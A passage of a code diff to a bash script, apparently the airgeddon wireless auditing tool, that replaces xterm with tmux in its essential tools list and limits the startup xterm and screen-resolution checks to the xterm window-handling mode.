+		essential_tools_names=(${essential_tools_names[@]/xterm/tmux})
+		possible_package_names[${essential_tools_names[7]}]="tmux"
+		unset possible_package_names["xterm"]
+	fi
+
 	set_possible_aliases
 	initialize_optional_tools_values
 
@@ -13189,18 +14077,20 @@ function main() {
 		check_bash_version
 		check_root_permissions
 
-		echo
-		if [[ ${resolution_detected} -eq 1 ]] && [[ "${xterm_ok}" -eq 1 ]]; then
-			language_strings "${language}" 294 "blue"
-		else
-			if [ "${xterm_ok}" -eq 0 ]; then
-				language_strings "${language}" 476 "red"
-				exit_code=1
-				exit_script_option
+		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+			echo
+			if [[ ${resolution_detected} -eq 1 ]] && [[ "${xterm_ok}" -eq 1 ]]; then
+				language_strings "${language}" 294 "blue"
 			else
-				language_strings "${language}" 295 "red"
-				echo
-				language_strings "${language}" 300 "yellow"
+				if [ "${xterm_ok}" -eq 0 ]; then
+					language_strings "${language}" 476 "red"
+					exit_code=1
+					exit_script_option
+				else
+					language_strings "${language}" 295 "red"
+					echo
+					language_strings "${language}" 300 "yellow"
+				fi
 			fi
 		fi
 
